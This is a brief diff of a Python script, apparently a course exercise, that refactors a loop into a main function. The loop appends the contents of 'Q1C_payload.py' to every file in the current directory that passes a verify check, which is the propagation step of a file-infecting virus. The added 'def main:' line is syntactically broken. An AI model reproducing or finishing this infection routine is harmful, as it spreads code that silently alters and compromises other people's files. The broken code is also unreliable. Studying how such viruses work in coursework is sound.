@@ -33,8 +33,10 @@ def inject(target_file, payload_file):
     with open(target_file, 'a+') as target_file, open(payload_file, 'r') as payload_file:
         target_file.write("\n")
         target_file.write(payload_file.read())
+def main:
+    for filename in pwd_directory_list:
+        if verify(filename): inject(filename, "Q1C_payload.py")
 
-for filename in pwd_directory_list:
-    if verify(filename): inject(filename, "Q1C_payload.py")
-    
+main()
+
         
